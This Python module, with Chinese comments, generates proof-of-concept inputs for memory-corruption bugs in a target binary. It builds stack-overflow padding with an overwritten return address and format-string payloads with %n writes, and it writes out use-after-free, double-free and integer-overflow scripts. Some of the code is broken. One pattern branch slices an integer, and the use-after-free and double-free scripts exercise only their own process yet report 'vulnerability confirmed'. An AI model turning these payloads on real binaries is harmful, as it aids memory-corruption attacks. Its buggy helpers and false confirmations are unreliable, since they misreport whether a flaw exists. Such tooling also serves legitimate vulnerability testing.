#!/usr/bin/env python3
"""
漏洞验证最小PoC自动生成模块

根据漏洞信息和约束条件生成最小化的漏洞验证输入数据。
支持的漏洞类型：
- 栈溢出
- 格式化字符串
- Use-After-Free
- Double Free
- 整数溢出
"""

import logging
import os
import struct
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """漏洞类型枚举"""
    STACK_BUFFER_OVERFLOW = "stack_buffer_overflow"
    FORMAT_STRING = "format_string"
    USE_AFTER_FREE = "use_after_free"
    DOUBLE_FREE = "double_free"
    INTEGER_OVERFLOW = "integer_overflow"
    HEAP_BUFFER_OVERFLOW = "heap_buffer_overflow"


class PoCOutputFormat(Enum):
    """PoC输出格式枚举"""
    BINARY = "binary"
    PYTHON = "python"
    C = "c"
    RAW = "raw"


@dataclass
class PoCOption:
    """
    PoC生成选项
    """
    output_format: PoCOutputFormat = PoCOutputFormat.BINARY
    output_dir: str = "./pocs"
    include_comments: bool = True
    generate_script: bool = True
    verbose: bool = False


@dataclass
class PoCResult:
    """
    PoC生成结果
    """
    success: bool = False
    vulnerability_type: str = ""
    poc_data: bytes = b""
    poc_path: str = ""
    script_content: str = ""
    description: str = ""
    error_message: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典格式"""
        return {
            'success': self.success,
            'vulnerability_type': self.vulnerability_type,
            'poc_path': self.poc_path,
            'description': self.description,
            'error_message': self.error_message
        }


class POCGenerator:
    """
    PoC生成器
    
    根据漏洞信息和约束条件生成最小化的漏洞验证输入数据。
    """

    def __init__(self, binary_path: str, binary_info: Dict[str, Any] = None):
        """
        初始化PoC生成器
        
        Args:
            binary_path: 目标二进制文件路径
            binary_info: 二进制信息字典（可选）
        """
        self.binary_path = binary_path
        self.binary_info = binary_info or {}
        self.bits = self.binary_info.get('bits', 64)
        self.arch = self.binary_info.get('arch', 'x86_64')

    def _validate_path(self) -> bool:
        """验证文件路径"""
        if not os.path.exists(self.binary_path):
            logger.error(f"文件不存在: {self.binary_path}")
            return False
        if not os.path.isfile(self.binary_path):
            logger.error(f"不是有效文件: {self.binary_path}")
            return False
        return True

    def _generate_pattern(self, length: int, pattern: str = 'A') -> bytes:
        """生成填充模式"""
        if pattern == 'A':
            return b'A' * length
        elif pattern == 'DEADBEEF':
            return self._generate_deadbeef_pattern(length)
        elif pattern == 'cyclic':
            return self._generate_cyclic_pattern(length)
        else:
            return pattern[:min(len(pattern), length)].encode() * ((length // len(pattern)) + 1)[:length]

    def _generate_deadbeef_pattern(self, length: int) -> bytes:
        """生成DEADBEEF模式"""
        pattern = b'\xDE\xAD\xBE\xEF'
        if self.bits == 64:
            pattern = b'\xDE\xAD\xBE\xEF\xDE\xAD\xBE\xEF'
        repeats = (length // len(pattern)) + 1
        return (pattern * repeats)[:length]

    def _generate_cyclic_pattern(self, length: int) -> bytes:
        """生成cyclic模式用于确定偏移"""
        result = b''
        for i in range(length):
            result += bytes([(i % 26) + ord('A')])
        return result

    def _generate_stack_overflow_poc(
        self,
        vulnerability_info: Dict[str, Any],
        options: PoCOption
    ) -> PoCResult:
        """
        生成栈溢出PoC
        
        Args:
            vulnerability_info: 漏洞信息
            options: 生成选项
            
        Returns:
            PoCResult 生成结果
        """
        result = PoCResult(vulnerability_type=VulnerabilityType.STACK_BUFFER_OVERFLOW.value)
        
        try:
            offset = vulnerability_info.get('offset', 128)
            return_address = vulnerability_info.get('return_address', 0xDEADBEEF)
            payload = vulnerability_info.get('payload', b'')
            
            # 生成填充数据
            padding = self._generate_pattern(offset, 'A')
            
            # 生成返回地址
            if self.bits == 64:
                return_bytes = struct.pack('<Q', return_address)
            else:
                return_bytes = struct.pack('<I', return_address & 0xFFFFFFFF)
            
            # 组合PoC数据
            poc_data = padding + return_bytes
            
            if payload:
                poc_data += payload
            
            result.poc_data = poc_data
            result.description = f"栈溢出PoC: 填充 {offset} 字节 + 返回地址 0x{return_address:x}"
            result.success = True
            
            if options.generate_script:
                result.script_content = self._generate_python_script(vulnerability_info, poc_data)
            
        except Exception as e:
            logger.error(f"生成栈溢出PoC失败: {e}")
            result.error_message = str(e)
        
        return result

    def _generate_format_string_poc(
        self,
        vulnerability_info: Dict[str, Any],
        options: PoCOption
    ) -> PoCResult:
        """
        生成格式化字符串漏洞PoC
        
        Args:
            vulnerability_info: 漏洞信息
            options: 生成选项
            
        Returns:
            PoCResult 生成结果
        """
        result = PoCResult(vulnerability_type=VulnerabilityType.FORMAT_STRING.value)
        
        try:
            num_specifiers = vulnerability_info.get('num_specifiers', 16)
            read_memory = vulnerability_info.get('read_memory', False)
            write_memory = vulnerability_info.get('write_memory', False)
            
            # 生成格式化字符串
            format_string = b''
            
            if read_memory:
                # 读取内存内容
                for i in range(num_specifiers):
                    format_string += b'%p.'
            else:
                # 基本的格式化字符串测试
                format_string = b'%x.' * num_specifiers
            
            if write_memory:
                # 添加写内存的格式化说明符
                format_string += b'%n'
            
            # 添加结束符
            format_string += b'\x00'
            
            result.poc_data = format_string
            result.description = f"格式化字符串PoC: {num_specifiers} 个%x说明符"
            result.success = True
            
            if options.generate_script:
                result.script_content = self._generate_format_string_script(vulnerability_info, format_string)
            
        except Exception as e:
            logger.error(f"生成格式化字符串PoC失败: {e}")
            result.error_message = str(e)
        
        return result

    def _generate_uaf_poc(
        self,
        vulnerability_info: Dict[str, Any],
        options: PoCOption
    ) -> PoCResult:
        """
        生成Use-After-Free漏洞PoC
        
        Args:
            vulnerability_info: 漏洞信息
            options: 生成选项
            
        Returns:
            PoCResult 生成结果
        """
        result = PoCResult(vulnerability_type=VulnerabilityType.USE_AFTER_FREE.value)
        
        try:
            # UAF漏洞需要特定的内存操作序列
            # 这里生成一个脚本来模拟UAF场景
            
            alloc_size = vulnerability_info.get('alloc_size', 128)
            free_count = vulnerability_info.get('free_count', 1)
            
            script = self._generate_uaf_script(vulnerability_info)
            
            result.poc_data = script.encode()
            result.description = f"UAF PoC脚本: 分配 {alloc_size} 字节, 释放 {free_count} 次"
            result.success = True
            result.script_content = script
            
        except Exception as e:
            logger.error(f"生成UAF PoC失败: {e}")
            result.error_message = str(e)
        
        return result

    def _generate_double_free_poc(
        self,
        vulnerability_info: Dict[str, Any],
        options: PoCOption
    ) -> PoCResult:
        """
        生成Double Free漏洞PoC
        
        Args:
            vulnerability_info: 漏洞信息
            options: 生成选项
            
        Returns:
            PoCResult 生成结果
        """
        result = PoCResult(vulnerability_type=VulnerabilityType.DOUBLE_FREE.value)
        
        try:
            alloc_size = vulnerability_info.get('alloc_size', 128)
            
            script = self._generate_double_free_script(vulnerability_info)
            
            result.poc_data = script.encode()
            result.description = f"Double Free PoC脚本: 分配 {alloc_size} 字节后双重释放"
            result.success = True
            result.script_content = script
            
        except Exception as e:
            logger.error(f"生成Double Free PoC失败: {e}")
            result.error_message = str(e)
        
        return result

    def _generate_integer_overflow_poc(
        self,
        vulnerability_info: Dict[str, Any],
        options: PoCOption
    ) -> PoCResult:
        """
        生成整数溢出漏洞PoC
        
        Args:
            vulnerability_info: 漏洞信息
            options: 生成选项
            
        Returns:
            PoCResult 生成结果
        """
        result = PoCResult(vulnerability_type=VulnerabilityType.INTEGER_OVERFLOW.value)
        
        try:
            overflow_value = vulnerability_info.get('overflow_value', 0x7FFFFFFF)
            target_size = vulnerability_info.get('target_size', 0)
            
            # 生成导致整数溢出的输入
            # 如果溢出值是0x7FFFFFFF，添加1就会溢出
            
            if self.bits == 64:
                poc_data = struct.pack('<Q', overflow_value)
            else:
                poc_data = struct.pack('<I', overflow_value)
            
            # 添加触发溢出的额外数据
            poc_data += b'\x01'  # 触发溢出的值
            
            result.poc_data = poc_data
            result.description = f"整数溢出PoC: 输入值 0x{overflow_value:x} 触发溢出"
            result.success = True
            
            if options.generate_script:
                result.script_content = self._generate_integer_overflow_script(vulnerability_info, poc_data)
            
        except Exception as e:
            logger.error(f"生成整数溢出PoC失败: {e}")
            result.error_message = str(e)
        
        return result

    def _generate_python_script(self, vulnerability_info: Dict[str, Any], poc_data: bytes) -> str:
        """生成Python测试脚本"""
        target_func = vulnerability_info.get('target_function', 'vulnerable_function')
        script = f'''#!/usr/bin/env python3
"""
PoC for Stack Buffer Overflow
Target: {self.binary_path}
Function: {target_func}
"""

import sys

def exploit():
    # PoC payload
    payload = {list(poc_data)}
    
    # Convert to bytes
    payload_bytes = bytes(payload)
    
    # Write to file
    with open('poc_input.bin', 'wb') as f:
        f.write(payload_bytes)
    
    print(f"[+] PoC generated: {len(payload_bytes)} bytes")
    print(f"[+] Saved to: poc_input.bin")
    print(f"[+] Usage: ./binary < poc_input.bin")

if __name__ == '__main__':
    exploit()
'''
        return script

    def _generate_format_string_script(self, vulnerability_info: Dict[str, Any], format_string: bytes) -> str:
        """生成格式化字符串测试脚本"""
        script = f'''#!/usr/bin/env python3
"""
PoC for Format String Vulnerability
Target: {self.binary_path}
"""

import sys

def exploit():
    # Format string payload
    payload = {list(format_string)}
    payload_bytes = bytes(payload)
    
    with open('poc_format.bin', 'wb') as f:
        f.write(payload_bytes)
    
    print(f"[+] Format string PoC generated")
    print(f"[+] Saved to: poc_format.bin")
    print(f"[+] Check for unexpected output or crashes")

if __name__ == '__main__':
    exploit()
'''
        return script

    def _generate_uaf_script(self, vulnerability_info: Dict[str, Any]) -> str:
        """生成UAF测试脚本"""
        alloc_size = vulnerability_info.get('alloc_size', 128)
        script = f'''#!/usr/bin/env python3
"""
PoC for Use-After-Free Vulnerability
Target: {self.binary_path}
"""

import sys
import ctypes

def exploit():
    libc = ctypes.CDLL('libc.so.6') if sys.platform == 'linux' else None
    
    if libc is None:
        print("[-] This script requires libc access")
        return
    
    # Allocate memory
    ptr = libc.malloc({alloc_size})
    print(f"[+] Allocated memory at: {{ptr:#x}}")
    
    # Free the memory
    libc.free(ptr)
    print(f"[+] Freed memory at: {{ptr:#x}}")
    
    # Attempt to use the freed memory
    print("[+] Attempting to use freed memory...")
    try:
        # This may crash or behave unexpectedly
        ctypes.memset(ptr, 0x41, {alloc_size})
        print("[!] Use-after-free successful (vulnerability confirmed)")
    except Exception as e:
        print(f"[-] Crash occurred: {{e}}")

if __name__ == '__main__':
    exploit()
'''
        return script

    def _generate_double_free_script(self, vulnerability_info: Dict[str, Any]) -> str:
        """生成Double Free测试脚本"""
        alloc_size = vulnerability_info.get('alloc_size', 128)
        script = f'''#!/usr/bin/env python3
"""
PoC for Double Free Vulnerability
Target: {self.binary_path}
"""

import sys
import ctypes

def exploit():
    libc = ctypes.CDLL('libc.so.6') if sys.platform == 'linux' else None
    
    if libc is None:
        print("[-] This script requires libc access")
        return
    
    # Allocate memory
    ptr = libc.malloc({alloc_size})
    print(f"[+] Allocated memory at: {{ptr:#x}}")
    
    # Free the memory first time
    libc.free(ptr)
    print(f"[+] First free at: {{ptr:#x}}")
    
    # Free the memory second time (double free)
    print("[+] Attempting double free...")
    try:
        libc.free(ptr)
        print("[!] Double free successful (vulnerability confirmed)")
    except Exception as e:
        print(f"[-] Crash occurred: {{e}}")

if __name__ == '__main__':
    exploit()
'''
        return script

    def _generate_integer_overflow_script(self, vulnerability_info: Dict[str, Any], poc_data: bytes) -> str:
        """生成整数溢出测试脚本"""
        script = f'''#!/usr/bin/env python3
"""
PoC for Integer Overflow Vulnerability
Target: {self.binary_path}
"""

import sys

def exploit():
    # Integer overflow payload
    payload = {list(poc_data)}
    payload_bytes = bytes(payload)
    
    with open('poc_overflow.bin', 'wb') as f:
        f.write(payload_bytes)
    
    print(f"[+] Integer overflow PoC generated")
    print(f"[+] Saved to: poc_overflow.bin")
    print(f"[+] Check for unexpected memory allocation behavior")

if __name__ == '__main__':
    exploit()
'''
        return script

    def _save_poc(self, result: PoCResult, options: PoCOption) -> str:
        """保存PoC文件"""
        try:
            os.makedirs(options.output_dir, exist_ok=True)
            
            vuln_id = result.vulnerability_type[:8]
            timestamp = __import__('datetime').datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if options.output_format == PoCOutputFormat.BINARY:
                poc_path = os.path.join(options.output_dir, f'poc_{vuln_id}_{timestamp}.bin')
                with open(poc_path, 'wb') as f:
                    f.write(result.poc_data)
            elif options.output_format == PoCOutputFormat.PYTHON and result.script_content:
                poc_path = os.path.join(options.output_dir, f'poc_{vuln_id}_{timestamp}.py')
                with open(poc_path, 'w') as f:
                    f.write(result.script_content)
            else:
                poc_path = os.path.join(options.output_dir, f'poc_{vuln_id}_{timestamp}.txt')
                with open(poc_path, 'wb') as f:
                    f.write(result.poc_data)
            
            return poc_path
            
        except Exception as e:
            logger.error(f"保存PoC文件失败: {e}")
            return ""

    def generate(
        self,
        vulnerability_info: Dict[str, Any],
        options: PoCOption = None
    ) -> PoCResult:
        """
        生成PoC
        
        Args:
            vulnerability_info: 漏洞信息字典
            options: PoC生成选项
            
        Returns:
            PoCResult 生成结果
        """
        logger.info(f"开始生成PoC，漏洞类型: {vulnerability_info.get('type')}")
        
        result = PoCResult()
        result.vulnerability_type = vulnerability_info.get('type', '')
        
        options = options or PoCOption()
        
        if not self._validate_path():
            result.error_message = f"无效的文件路径: {self.binary_path}"
            return result
        
        try:
            vuln_type = vulnerability_info.get('type')
            
            if vuln_type == VulnerabilityType.STACK_BUFFER_OVERFLOW.value:
                result = self._generate_stack_overflow_poc(vulnerability_info, options)
            elif vuln_type == VulnerabilityType.FORMAT_STRING.value:
                result = self._generate_format_string_poc(vulnerability_info, options)
            elif vuln_type == VulnerabilityType.USE_AFTER_FREE.value:
                result = self._generate_uaf_poc(vulnerability_info, options)
            elif vuln_type == VulnerabilityType.DOUBLE_FREE.value:
                result = self._generate_double_free_poc(vulnerability_info, options)
            elif vuln_type == VulnerabilityType.INTEGER_OVERFLOW.value:
                result = self._generate_integer_overflow_poc(vulnerability_info, options)
            else:
                result.error_message = f"不支持的漏洞类型: {vuln_type}"
                return result
            
            if result.success and (result.poc_data or result.script_content):
                result.poc_path = self._save_poc(result, options)
            
            logger.info(f"PoC生成成功: {result.poc_path}")
            
        except Exception as e:
            logger.error(f"PoC生成失败: {e}")
            result.error_message = str(e)
        
        return result
